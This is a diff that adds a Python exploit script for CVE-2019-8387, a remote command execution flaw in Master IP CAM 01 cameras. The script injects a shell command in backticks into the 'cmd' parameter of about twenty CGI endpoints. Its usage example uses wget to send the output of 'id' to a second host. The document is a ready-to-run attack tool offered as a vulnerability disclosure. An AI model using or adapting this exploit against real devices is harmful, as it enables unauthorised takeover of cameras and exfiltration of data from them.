@@ -1,0 +1,52 @@
+# Exploit Title: Master IP CAM 01 Remote Command Execution
+# Date: 09-02-2019
+# Remote: Yes
+# Exploit Authors: Raffaele Sabato
+# Contact: https://twitter.com/syrion89
+# Vendor: Master IP CAM
+# Version: 3.3.4.2103
+# CVE: CVE-2019-8387
+
+import sys
+import requests
+
+
+if len(sys.argv) < 3:
+	print "[-] Usage: python MasterIpCamRCE.py <ip> <cmd>"
+  	print "[-] Example: python MasterIpCamRCE.py 192.168.1.54 'wget http://192.168.1.55:4444/$(id)'"
+  	exit(1)
+
+host = sys.argv[1]
+command = sys.argv[2]
+page = [
+		"bconf.cgi",
+		"ddns_start.cgi",
+		"getddnsattr.cgi",
+		"getinetattr.cgi",
+		"getnettype.cgi",
+		"getupnp.cgi",
+		"getwifiattr.cgi",
+		"getwifistatus.cgi",
+		"inetconfig.cgi",
+		"iptest.cgi",
+		"listwifiap.cgi",
+		"p2p.cgi",
+		"paraconf.cgi",
+		"scanwifi.cgi",
+		"setadslattr.cgi",
+		"setddnsattr.cgi",
+		"setinetattr.cgi",
+		"setwifiattr.cgi",
+		"upnp_start.cgi",
+		"wifimode.cgi",
+		"wifitest.cgi",
+		]
+for x in page:
+	url = "http://"+host+"/cgi-bin/"+x+"?cmd=`"+command+"`"
+	#url = "http://"+host+"/cgi-bin/"+x+"?action=`"+command+"`"
+	print "[*] Attack on "+x
+	print "[+] Sending the payload"
+	r = requests.get(url)
+	if r.status_code == 200:
+		print "[+] Exploit Success"
+		break
